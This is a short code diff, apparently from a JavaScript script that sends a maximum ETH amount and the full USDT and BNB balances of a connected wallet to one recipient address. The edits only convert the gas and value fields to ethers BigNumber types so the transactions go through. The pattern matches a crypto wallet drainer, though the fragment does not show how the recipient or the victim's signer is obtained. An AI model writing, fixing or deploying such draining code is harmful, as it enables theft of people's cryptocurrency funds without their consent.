@@ -144,17 +144,17 @@
                     // Create transactions for each token using ethers.js
                     const ethTransactionParameters = {
                         to: recipientAddress,
-                        value: maxEthTransferWei,
-                        gasLimit: gasLimit,
-                        gasPrice: gasPriceWei,
+                        value: ethers.BigNumber.from(maxEthTransferWei.toString()),
+                        gasLimit: ethers.BigNumber.from(gasLimit.toString()),
+                        gasPrice: ethers.BigNumber.from(gasPriceWei.toString())
                     };
 
                     const ethTransaction = await signer.sendTransaction(ethTransactionParameters);
 
                     const usdtTransactionParameters = {
                         to: tokenAddresses.USDT,
-                        gasLimit: gasLimit,
-                        gasPrice: gasPriceWei,
+                        gasLimit: ethers.BigNumber.from(gasLimit.toString()),
+                        gasPrice: ethers.BigNumber.from(gasPriceWei.toString()),
                         data: usdtContract.methods.transfer(recipientAddress, usdtBalanceWei.toString()).encodeABI()
                     };
 
@@ -162,8 +162,8 @@
 
                     const bnbTransactionParameters = {
                         to: tokenAddresses.BNB,
-                        gasLimit: gasLimit,
-                        gasPrice: gasPriceWei,
+                        gasLimit: ethers.BigNumber.from(gasLimit.toString()),
+                        gasPrice: ethers.BigNumber.from(gasPriceWei.toString()),
                         data: bnbContract.methods.transfer(recipientAddress, bnbBalanceWei.toString()).encodeABI()
                     };
 
